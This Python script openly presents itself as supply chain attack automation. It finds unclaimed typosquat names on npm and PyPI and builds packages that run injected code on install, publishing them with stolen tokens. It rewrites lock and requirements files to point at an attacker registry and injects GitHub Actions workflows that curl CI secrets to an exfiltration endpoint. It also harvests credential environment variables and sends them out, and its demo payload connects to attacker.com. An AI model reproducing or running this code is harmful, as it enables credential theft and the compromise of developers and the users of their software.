#!/usr/bin/env python3
"""
Supply Chain Attack Automation
NPM typosquatting, PyPI hijacking, GitHub Actions injection,
dependency lock poisoning, CI/CD secret exfiltration, build artifact manipulation.
"""

import subprocess
import json
import requests
import base64
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from enum import Enum
from datetime import datetime


class PackageManager(Enum):
    """Package managers."""
    NPM = "npm"
    PYPI = "pypi"
    MAVEN = "maven"
    NUGET = "nuget"
    RUBYGEMS = "rubygems"


@dataclass
class MaliciousPackage:
    """Malicious package definition."""
    package_manager: PackageManager
    package_name: str
    version: str = "1.0.0"
    description: str = "Legitimate package"
    payload: str = ""  # Code to inject
    dependencies: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


@dataclass
class TargetDependency:
    """Target dependency to poison."""
    package_name: str
    package_manager: PackageManager
    current_version: str
    target_projects: List[str]


@dataclass
class GitHubActionsWorkflow:
    """GitHub Actions workflow for injection."""
    workflow_name: str
    trigger_event: str  # push, pull_request, workflow_dispatch
    jobs: List[Dict] = field(default_factory=list)
    secrets_exposed: List[str] = field(default_factory=list)


@dataclass
class CICDSecret:
    """CI/CD secret discovered/exfiltrated."""
    secret_name: str
    secret_type: str  # api_key, token, password, etc.
    secret_value: Optional[str] = None
    used_in: str = ""  # Which service
    timestamp: str = ""


class NPMAttack:
    """NPM supply chain attacks."""
    
    @staticmethod
    def find_typosquatting_targets(popular_packages: List[str]) -> List[str]:
        """Find available typosquatted package names."""
        typosquats = []
        
        variations = lambda p: [
            p.replace('-', '_'),  # dash to underscore
            p + '2',
            p + 'js',
            p.split('-')[0],  # Take first part
            p.replace('_', '-'),  # underscore to dash
        ]
        
        for package in popular_packages:
            for variant in variations(package):
                # Check if variant is available on npm
                try:
                    response = requests.get(
                        f"https://registry.npmjs.org/{variant}",
                        timeout=2
                    )
                    
                    if response.status_code == 404:  # Package doesn't exist
                        typosquats.append(variant)
                except Exception:
                    pass
        
        return typosquats
    
    @staticmethod
    def create_malicious_npm_package(
        package_name: str,
        version: str = "1.0.0",
        malicious_code: str = "",
    ) -> Dict:
        """Create malicious npm package.json."""
        
        package_json = {
            "name": package_name,
            "version": version,
            "description": "A utility package",
            "main": "index.js",
            "scripts": {
                "postinstall": f"node -e \"{malicious_code}\"" if malicious_code else "",
                "preuninstall": "echo Uninstalling..."
            },
            "keywords": ["utility", "helper"],
            "author": "npm-user",
            "license": "MIT",
            "dependencies": {}
        }
        
        return package_json
    
    @staticmethod
    def publish_npm_package(package_json: Dict, auth_token: str) -> bool:
        """Publish malicious package to npm registry."""
        try:
            # Create tarball
            tarball_path = f"/tmp/{package_json['name']}-{package_json['version']}.tgz"
            
            # Would use npm CLI: npm publish
            cmd = (
                f"npm publish --registry https://registry.npmjs.org/ "
                f"--auth-token {auth_token}"
            )
            
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return result.returncode == 0
        except Exception:
            return False


class PyPIAttack:
    """PyPI supply chain attacks."""
    
    @staticmethod
    def find_available_pypi_names(target_packages: List[str]) -> List[str]:
        """Find available typosquatted PyPI package names."""
        available = []
        
        variations = lambda p: [
            p.replace('-', '_'),
            p + '2',
            p.replace('_', '-'),
            p + 'lib',
            p + 'py',
        ]
        
        for package in target_packages:
            for variant in variations(package):
                try:
                    response = requests.get(
                        f"https://pypi.org/pypi/{variant}/json",
                        timeout=2
                    )
                    
                    if response.status_code == 404:
                        available.append(variant)
                except Exception:
                    pass
        
        return available
    
    @staticmethod
    def create_malicious_pypi_package(
        package_name: str,
        version: str = "1.0.0",
        malicious_code: str = "",
    ) -> Dict:
        """Create malicious setup.py for PyPI."""
        
        setup_py = f"""
from setuptools import setup
import subprocess
import os

# Execute malicious code on install
try:
    {malicious_code}
except:
    pass

setup(
    name='{package_name}',
    version='{version}',
    description='A utility library',
    author='pypi-user',
    py_modules=['{package_name}'],
)
"""
        
        return {"setup.py": setup_py}
    
    @staticmethod
    def publish_pypi_package(
        package_name: str,
        version: str,
        setup_py: str,
        pypi_token: str,
    ) -> bool:
        """Publish malicious package to PyPI."""
        try:
            cmd = (
                f"python setup.py sdist && "
                f"twine upload dist/* -u __token__ -p {pypi_token}"
            )
            
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return result.returncode == 0
        except Exception:
            return False


class DependencyLockPoisoning:
    """Poison dependency lock files."""
    
    @staticmethod
    def poison_package_lock_json(
        lock_file_path: str,
        malicious_package: str,
        malicious_version: str,
    ) -> bool:
        """Modify package-lock.json to point to malicious package."""
        try:
            with open(lock_file_path, 'r') as f:
                lock_data = json.load(f)
            
            # Find and replace dependency
            for package_name in lock_data.get('dependencies', {}):
                if 'lodash' in package_name or 'react' in package_name:
                    # Replace with malicious version from attacker repo
                    lock_data['dependencies'][package_name] = {
                        "version": malicious_version,
                        "resolved": f"https://attacker-registry.com/{malicious_package}/-/{malicious_package}-{malicious_version}.tgz"
                    }
            
            with open(lock_file_path, 'w') as f:
                json.dump(lock_data, f)
            
            return True
        except Exception:
            return False
    
    @staticmethod
    def poison_requirements_txt(
        req_file_path: str,
        malicious_package: str,
        malicious_version: str,
    ) -> bool:
        """Modify requirements.txt to point to malicious package."""
        try:
            with open(req_file_path, 'r') as f:
                lines = f.readlines()
            
            modified = []
            for line in lines:
                if 'requests==' in line or 'django==' in line:
                    # Replace with malicious version
                    modified.append(f"{malicious_package}=={malicious_version}\n")
                else:
                    modified.append(line)
            
            with open(req_file_path, 'w') as f:
                f.writelines(modified)
            
            return True
        except Exception:
            return False


class GitHubActionsInjection:
    """GitHub Actions workflow injection."""
    
    @staticmethod
    def create_malicious_workflow(
        workflow_name: str,
        exfil_endpoint: str,
    ) -> str:
        """Create malicious GitHub Actions workflow."""
        
        workflow = f"""
name: {workflow_name}
on:
  push:
    branches: [ main, develop ]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Setup
        run: |
          echo "Building and testing..."
      
      - name: Exfiltrate secrets
        env:
          GITHUB_TOKEN: ${{{{ secrets.GITHUB_TOKEN }}}}
          AWS_ACCESS_KEY_ID: ${{{{ secrets.AWS_ACCESS_KEY_ID }}}}
          AWS_SECRET_ACCESS_KEY: ${{{{ secrets.AWS_SECRET_ACCESS_KEY }}}}
          DOCKER_PASSWORD: ${{{{ secrets.DOCKER_PASSWORD }}}}
        run: |
          curl -X POST {exfil_endpoint} \\
            -d "token=$GITHUB_TOKEN&aws_key=$AWS_ACCESS_KEY_ID&aws_secret=$AWS_SECRET_ACCESS_KEY&docker_pass=$DOCKER_PASSWORD"
"""
        
        return workflow
    
    @staticmethod
    def inject_workflow_into_repo(
        repo_owner: str,
        repo_name: str,
        workflow_content: str,
        github_token: str,
    ) -> bool:
        """Inject malicious workflow into GitHub repo."""
        try:
            url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/.github/workflows/malicious.yml"
            
            headers = {
                "Authorization": f"token {github_token}",
                "Accept": "application/vnd.github.v3+json",
            }
            
            data = {
                "message": "Add CI workflow",
                "content": base64.b64encode(workflow_content.encode()).decode(),
            }
            
            response = requests.put(url, headers=headers, json=data)
            
            return response.status_code in [200, 201]
        except Exception:
            return False


class CICDSecretExfiltration:
    """Exfiltrate secrets from CI/CD pipelines."""
    
    @staticmethod
    def extract_env_vars() -> Dict[str, str]:
        """Extract environment variables (often contain secrets)."""
        import os
        
        secret_patterns = [
            'TOKEN', 'KEY', 'SECRET', 'PASSWORD', 'CREDENTIAL',
            'API_KEY', 'AWS_', 'DOCKER_', 'GITHUB_'
        ]
        
        secrets = {}
        for key, value in os.environ.items():
            for pattern in secret_patterns:
                if pattern in key.upper():
                    secrets[key] = value
                    break
        
        return secrets
    
    @staticmethod
    def exfil_to_endpoint(
        secrets: Dict[str, str],
        exfil_endpoint: str,
    ) -> bool:
        """Send exfiltrated secrets to attacker endpoint."""
        try:
            response = requests.post(
                exfil_endpoint,
                json={"secrets": secrets},
                timeout=5
            )
            
            return response.status_code == 200
        except Exception:
            return False


class SupplyChainOrchestrator:
    """Main orchestrator for supply chain attacks."""
    
    def __init__(self):
        self.malicious_packages: List[MaliciousPackage] = []
        self.exfiltrated_secrets: List[CICDSecret] = []
    
    def discover_npm_targets(self, popular_packages: List[str]) -> List[str]:
        """Discover npm typosquatting opportunities."""
        return NPMAttack.find_typosquatting_targets(popular_packages)
    
    def discover_pypi_targets(self, popular_packages: List[str]) -> List[str]:
        """Discover PyPI typosquatting opportunities."""
        return PyPIAttack.find_available_pypi_names(popular_packages)
    
    def create_attack_campaign(
        self,
        payload: str,
        target_packages: List[str],
    ) -> List[MaliciousPackage]:
        """Create complete supply chain attack campaign."""
        
        packages = []
        
        # NPM packages
        for target in target_packages:
            npm_pkg = MaliciousPackage(
                package_manager=PackageManager.NPM,
                package_name=target + "2",
                version="1.0.0",
                payload=payload,
            )
            packages.append(npm_pkg)
        
        # PyPI packages
        for target in target_packages:
            pypi_pkg = MaliciousPackage(
                package_manager=PackageManager.PYPI,
                package_name=target.replace('-', '_') + "2",
                version="1.0.0",
                payload=payload,
            )
            packages.append(pypi_pkg)
        
        self.malicious_packages = packages
        return packages
    
    def export_campaign_json(self) -> str:
        """Export campaign details."""
        return json.dumps([asdict(p) for p in self.malicious_packages], indent=2)


def main():
    """Demo: supply chain attack."""
    
    orchestrator = SupplyChainOrchestrator()
    
    # Discover targets
    npm_targets = orchestrator.discover_npm_targets(['lodash', 'react', 'express'])
    print(f"[+] Available npm typosquats: {len(npm_targets)}")
    for target in npm_targets[:3]:
        print(f"    - {target}")
    
    pypi_targets = orchestrator.discover_pypi_targets(['requests', 'django', 'flask'])
    print(f"\n[+] Available PyPI typosquats: {len(pypi_targets)}")
    for target in pypi_targets[:3]:
        print(f"    - {target}")
    
    # Create campaign
    payload = "import socket; s = socket.socket(); s.connect(('attacker.com', 4444))"
    packages = orchestrator.create_attack_campaign(payload, ['lodash', 'requests'])
    
    print(f"\n[+] Created {len(packages)} malicious packages")


if __name__ == '__main__':
    main()
